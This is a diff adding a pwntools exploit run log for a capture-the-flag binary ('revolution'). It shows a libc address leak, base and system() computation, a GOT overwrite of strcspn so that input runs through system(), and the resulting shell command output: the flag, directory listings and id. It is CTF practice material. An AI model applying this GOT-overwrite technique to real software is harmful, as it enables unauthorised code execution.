@@ -1,0 +1,52 @@
+[*] mode      : LOCAL /home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution
+[*] target libc: local libc /usr/lib/libc.so.6
+[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution'
+[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution': pid 3509951
+[*] code probe @0x4010d0 = f30f1efa4154ba1f
+[+] setvbuf@libc = 0x7f3fcb6843f0   ->   libc base = 0x7f3fcb600000
+[*] &_IO_2_1_stdout_ = 0x7f3fcb817580 (base+0x217580)
+[+] system = 0x7f3fcb654580
+[+] strcspn@got overwritten -> main() runs system(buf) on the next line
+sun{LOCAL_TEST_FLAG}
+sun{LOCAL_TEST_FLAG}
+total 2204
+drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 00:31 .
+drwxr-xr-x 10 kzzz kzzz    4096 Sep 28 00:14 ..
+-rwxr-xr-x  1 kzzz kzzz    8589 Sep 28 00:32 exploit.py
+-rw-r--r--  1 kzzz kzzz      21 Sep 28 00:17 flag.txt
+-rw-r--r--  1 kzzz kzzz      36 Sep 28 00:29 FLAG.txt
+-rwxr-xr-x  1 kzzz kzzz 2125328 Sep 28 00:26 libc-2.39-0ubuntu8.3.so.6
+-rw-r--r--  1 kzzz kzzz     571 Sep 28 00:32 local_run.log
+-rw-------  1 kzzz kzzz   46740 Sep 28 00:31 notes.md
+-rw-------  1 kzzz kzzz    2601 Sep 28 00:31 NOTES_SUMMARY.txt
+-rw-r--r--  1 kzzz kzzz    2112 Sep 28 00:31 remote_run.log
+-rw-r--r--  1 kzzz kzzz   20893 Sep 28 00:14 rev.asm
+-rwxr-xr-x  1 kzzz kzzz   14520 Sep 28 00:09 revolution
+total 68
+dr-xr-xr-x  17 nobody nobody  4096 Jun 30 23:10 .
+dr-xr-xr-x  17 nobody nobody  4096 Jun 30 23:10 ..
+lrwxrwxrwx   1 nobody nobody     7 Oct 13  2025 bin -> usr/bin
+drwxr-xr-x   4 nobody nobody  4096 Aug  3 16:58 boot
+drwxr-xr-x   4 kzzz   kzzz     320 Sep 28 00:32 dev
+drwxr-xr-x 120 nobody nobody 12288 Sep 27 21:53 etc
+drwxr-xr-x   4 nobody nobody  4096 Jun 30 23:16 home
+lrwxrwxrwx   1 nobody nobody     7 Oct 13  2025 lib -> usr/lib
+lrwxrwxrwx   1 nobody nobody     7 Oct 13  2025 lib64 -> usr/lib
+drwx------   2 nobody nobody 16384 Jun 30 23:07 lost+found
+drwxr-xr-x   3 nobody nobody  4096 Aug  4 00:13 mnt
+drwxr-xr-x  11 nobody nobody  4096 Aug  8 15:20 opt
+dr-xr-xr-x 567 nobody nobody     0 Sep 17 17:10 proc
+drwxr-x---   5 nobody nobody  4096 Aug  4 00:50 root
+drwxr-xr-x  40 nobody nobody   960 Sep 25 20:59 run
+lrwxrwxrwx   1 nobody nobody     7 Oct 13  2025 sbin -> usr/bin
+drwxr-xr-x   4 nobody nobody  4096 Jun 30 23:10 srv
+dr-xr-xr-x  13 nobody nobody     0 Sep 28 00:28 sys
+drwxr-xr-x   2 kzzz   kzzz      40 Sep 28 00:32 tmp
+drwxr-xr-x  10 nobody nobody  4096 Sep 23 11:37 usr
+drwxr-xr-x  13 nobody nobody  4096 Sep 17 09:10 var
+uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
+DONE
+
+score> 
+FLAG: sun{LOCAL_TEST_FLAG}
+[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution' (pid 3509951)
